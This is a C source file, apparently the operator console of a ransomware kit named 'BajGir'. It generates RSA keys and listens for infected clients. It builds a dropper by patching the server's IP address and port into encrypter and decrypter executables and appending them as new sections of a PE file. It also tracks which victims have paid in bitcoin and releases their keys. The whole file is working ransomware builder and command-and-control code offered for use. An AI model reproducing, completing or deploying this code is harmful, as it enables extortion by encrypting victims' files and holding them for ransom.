#include "common.h"
#include "sock.h"
#include "crypt.h"

DWORD align(DWORD size, DWORD align, DWORD addr) {
	if (!(size % align))
		return addr + size;
	return addr + (size / align + 1) * align;
}

bool add_section(char* file_path, char* section_name, DWORD section_size) {
	HANDLE file = NULL;
	DWORD file_size = 0;
	LPVOID read_file = NULL;

	file = CreateFile(file_path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to open file %lu\n", GetLastError());
		return false;
	}
	file_size = GetFileSize(file, 0);
	read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
	if (read_file == NULL) {
		printf("read_file allocation failed.\n");
		return false;
	}
	if (!ReadFile(file, read_file, file_size, &file_size, NULL)) {
		printf("ReadFile failed.\n");
		return false;
	}

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)((PBYTE)read_file);
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("not valid PE\n");
		return false;
	}

	PIMAGE_FILE_HEADER fh = (PIMAGE_FILE_HEADER)((PBYTE)read_file + dos->e_lfanew + sizeof(DWORD));
	PIMAGE_OPTIONAL_HEADER oh = (PIMAGE_OPTIONAL_HEADER)((PBYTE)read_file + dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
	PIMAGE_SECTION_HEADER sh = (PIMAGE_SECTION_HEADER)((PBYTE)read_file + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	memset(&sh[fh->NumberOfSections], 0, sizeof(IMAGE_SECTION_HEADER));
	memcpy(&sh[fh->NumberOfSections].Name, section_name, 8);

	sh[fh->NumberOfSections].Misc.VirtualSize = align(section_size, oh->SectionAlignment, 0);
	sh[fh->NumberOfSections].VirtualAddress = align(sh[fh->NumberOfSections - 1].Misc.VirtualSize, oh->SectionAlignment, sh[fh->NumberOfSections - 1].VirtualAddress);
	sh[fh->NumberOfSections].SizeOfRawData = align(section_size, oh->FileAlignment, 0);
	sh[fh->NumberOfSections].PointerToRawData = align(sh[fh->NumberOfSections - 1].SizeOfRawData, oh->FileAlignment, sh[fh->NumberOfSections - 1].PointerToRawData);
	sh[fh->NumberOfSections].Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

	SetFilePointer(file, sh[fh->NumberOfSections].PointerToRawData + sh[fh->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
	SetEndOfFile(file);
	oh->SizeOfImage = sh[fh->NumberOfSections].VirtualAddress + sh[fh->NumberOfSections].Misc.VirtualSize;
	fh->NumberOfSections += 1;
	SetFilePointer(file, 0, 0, 0);
	if (!WriteFile(file, read_file, file_size, &file_size, NULL)) {
		printf("failed to write to file.\n");
		return false;
	}
	CloseHandle(file);
}

bool section_add_data(char* file_path, LPVOID data, DWORD size) {
	HANDLE file = NULL;
	DWORD file_size = 0;
	LPVOID read_file = NULL;

	file = CreateFile(file_path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to open file.\n");
		return false;
	}
	file_size = GetFileSize(file, 0);
	read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
	if (read_file == NULL) {
		printf("read_file allocation failed.\n");
		return false;
	}
	if (!ReadFile(file, read_file, file_size, &file_size, NULL)) {
		printf("ReadFile failed.\n");
		return false;
	}

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)read_file;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("not valid PE\n");
		return false;
	}
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)read_file + dos->e_lfanew);
	PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
	PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1);

	SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);

	if (!WriteFile(file, data, size, &file_size, NULL)) {
		printf("WriteFile failed\n");
		return false;
	}
	CloseHandle(file);
	return true;

}

bool generate_dropper(char* file_name, char* ip, int port) {
	HANDLE file = NULL;
	LPVOID read_file = NULL, enc = NULL, dec = NULL;
	DWORD file_size, pub_key_size = 0, enc_size = 0, dec_size = 0;

	file = CreateFileA("public_key.txt", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		puts("failed to open public_key.exe\n");
		file = NULL;
		goto fail;
	}
	file_size = GetFileSize(file, NULL);
	read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
	if (read_file == NULL) {
		printf("public_key allocation failed %d\n", file_size);
		goto fail;
	}
	if (!ReadFile(file, read_file, file_size, &file_size, NULL)) {
		printf("failed to read public_key.exe %d\n", GetFileSize(file, NULL));
		goto fail;
	}
	if (add_section("encrypter.exe", "pkey", file_size) == false) {
		printf("add_section failed\n");
		goto fail;
	}
	if (section_add_data("encrypter.exe", read_file, file_size) == false) {
		printf("section_add_data failed\n");
		goto fail;
	}
	HeapFree(GetProcessHeap(), 0, read_file);
	CloseHandle(file);
	file = NULL;
	read_file = NULL;

	file = CreateFileA("encrypter.exe", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to open file.\n");
		file = NULL;
		goto fail;
	}
	enc_size = GetFileSize(file, NULL);
	enc = HeapAlloc(GetProcessHeap(), 0, enc_size);
	if (enc == NULL) {
		printf("read_file allocation failed %lu\n", enc_size);
		goto fail;
	}
	if (!ReadFile(file, enc, enc_size, &enc_size, NULL)) {
		printf("ReadFile failed.\n");
		goto fail;
	}
	for (int i = 0; i < enc_size; ++i) {
		if (((PBYTE)enc)[i] == '9') {
			if (memcmp(&(((PBYTE)enc)[i]), "999.888.777.666", 15) == 0) {
				memcpy(&(((PBYTE)enc)[i]), ip, 15);
			}
		}
	}
	for (int i = 0; i < enc_size; ++i) {
		if (((PBYTE)enc)[i] == '9') {
			if (memcmp(&(((PBYTE)enc)[i]), "99999", 5) == 0) {
				memcpy(&(((PBYTE)enc)[i]), port, 5);
			}
		}
	}
	CloseHandle(file);
	file = NULL;

	file = CreateFileA("decrypter.exe", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to open file.\n");
		file = NULL;
		goto fail;
	}
	dec_size = GetFileSize(file, NULL);
	dec = HeapAlloc(GetProcessHeap(), 0, dec_size);
	if (dec == NULL) {
		printf("read_file allocation failed %lu\n", dec_size);
		goto fail;
	}
	if (!ReadFile(file, dec, dec_size, &dec_size, NULL)) {
		printf("ReadFile failed.\n");
		goto fail;
	}
	for (int i = 0; i < dec_size; ++i) {
		if (((PBYTE)dec)[i] == '9') {
			if (memcmp(&(((PBYTE)dec)[i]), "999.888.777.666", 15) == 0) {
				memcpy(&(((PBYTE)dec)[i]), ip, 15);
			}
		}
	}
	for (int i = 0; i < dec_size; ++i) {
		if (((PBYTE)dec)[i] == '9') {
			if (memcmp(&(((PBYTE)dec)[i]), "99999", 5) == 0) {
				memcpy(&(((PBYTE)dec)[i]), port, 5);
			}
		}
	}
	CloseHandle(file);
	file = NULL;

	file = CreateFileA("droper.exe", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to open file.\n");
		file = NULL;
		goto fail;
	}

	file_size = GetFileSize(file, NULL);
	read_file = HeapAlloc(GetProcessHeap(), NULL, file_size);
	if (read_file == NULL) {
		printf("failed to allocate heap %d\n", file_size);
		goto fail;
	}
	if (!ReadFile(file, read_file, file_size, &file_size, NULL)) {
		printf("ReadFile failed %lu\n", GetLastError());
		goto fail;
	}
	CloseHandle(file);
	file = NULL;

	file = CreateFileA(file_name, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to open file.\n");
		file = NULL;
		goto fail;
	}

	if (!WriteFile(file, read_file, file_size, &file_size, NULL)) {
		printf("WriteFile failed %lu\n", GetLastError());
		goto fail;
	}
	CloseHandle(file);
	HeapFree(GetProcessHeap(), 0, read_file);
	file = NULL;
	read_file = NULL;

	if (add_section(file_name, "encrypt", enc_size) == false) {
		printf("add_section failed\n");
		goto fail;
	}

	if (section_add_data(file_name, enc, enc_size) == false) {
		printf("section_add_data failed\n");
		goto fail;
	}

	if (add_section(file_name, "decrypt", dec_size) == false) {
		printf("add_section failed\n");
		goto fail;
	}

	if (section_add_data(file_name, dec, dec_size) == false) {
		printf("section_add_data failed\n");
		goto fail;
	}

	HeapFree(GetProcessHeap(), 0, dec);
	HeapFree(GetProcessHeap(), 0, enc);

	return true;

fail:
	if (file) CloseHandle(file);
	if (read_file) HeapFree(GetProcessHeap(), 0, read_file);
	if (enc) HeapFree(GetProcessHeap(), 0, enc);
	if (dec) HeapFree(GetProcessHeap(), 0, dec);
	return false;
}

void terminate_all(HANDLE sock_thread, pclient_socket socket_head, WSADATA* wsa) {
	terminate_flag = 1;
	
}

int main() {
	WSADATA wsa;
	NCRYPT_KEY_HANDLE key = 0;
	NCRYPT_PROV_HANDLE handle = 0;
	client_socket socket_client = { 0 };
	HANDLE sock_thread = INVALID_HANDLE_VALUE;
	char file_name[MAX_PATH];
	char ip[16] = { 0 };
	char port[6] = { 0 };
	char bit_paid[16] = { 0 };
	char n;
	void* arg[3];
	int port_number = 0;

	int ret = 0;

	while (1) {
		printf("Welcome to BajGir.\n");
		printf("\
		1-set configuration\n\
		2-generate new RSA key for communication(this should only be used once)\n\
		3-start listening\n\
		4-generate the dropper\n\
		5-print configuration\n\
		6-set victim as paied\n\
		7-print victim key to file\n\
		8-decrypt one file\n\
		9-exit !WARNING! ALL CLIENTS WILL BE DISCONNECTED\n");
		n = getchar();
		getch();
		switch (n) {
		case '1':
			memset(file_name, '\0', MAX_PATH);
			memset(ip, '\0', 16);
			memset(port, '\0', 6);
			printf("your file name: ");
			fgets(file_name, MAX_PATH, stdin);
			CLEAN(file_name);
			printf("ip address of the server: ");
			fgets(ip, 16, stdin);
			CLEAN(ip);
			printf("the port number to connect to: ");
			fgets(port, 6, stdin);
			CLEAN(port);
			break;
		case '2':
			if (generate_asymmetric_key(&handle, &key, NULL) == false) {
				printf("generate_asymmetric_key failed.\n");
				break;
			}
			if (export_key(&key) == false) {
				printf("export key failed.\n");
				break;
			}
			break;
		case '3':
			arg[0] = &wsa;
			port_number = atoi(port);
			arg[1] = &port_number;
			arg[2] = &socket_client;
			sock_thread = CreateThread(NULL, NULL, init_sock, arg, NULL, NULL);
			break;
		case '4':
			if (generate_dropper(file_name, ip, port) == false)
				printf("generate_dropper failed\n");
			else
				printf("generating dropper successful\n");
			break;
		case '5':
			printf("file name: %s - %s:%s\n", file_name, ip, port);
			system("PAUSE");
			break;
		case '6':
			memset(bit_paid, 0, 16);
			puts("Enter bit price paid: ");
			fgets(bit_paid, 16, stdin);
			if (strchr(bit_paid, '\n') != NULL) bit_paid[strlen(bit_paid) - 1] = '\0';
			else getch();
			ret = verify_payment(bit_paid, false);
			switch (ret) {
			case 0:
				puts("failed to verify payment\n");
				break;
			case 1:
				puts("payment verification updated\n");
				break;
			case 2:
				puts("payment already verified\n");
				break;
			case 3:
				puts("could not find such bit price\n");
				break;
			default:
				puts("unexpected error!\n");
				break;
			}
			system("PAUSE");
			break;
		case '7':
			memset(bit_paid, 0, 16);
			puts("Enter bit price paid: ");
			fgets(bit_paid, 16, stdin);
			if (strchr(bit_paid, '\n') != NULL) bit_paid[strlen(bit_paid) - 1] = '\0';
			else getch();
			ret = verify_payment(bit_paid, true);
			switch (ret) {
			case 0:
				puts("failed to verify payment\n");
				break;
			case 1:
				puts("wrote to file\n");
				break;
			case 2:
				puts("payment already verified\n");
				break;
			case 3:
				puts("could not find such bit price\n");
				break;
			default:
				puts("unexpected error!\n");
				break;
			}
			system("PAUSE");
			break;
		case '8':
			decrypt_one_file();
			break;
		case '9':
			terminate_all(&socket_client, sock_thread, &wsa);
		default:
			printf("no such option available.\n");
			break;
		}
		Sleep(1500);
		system("cls");
	}
	return 0;
}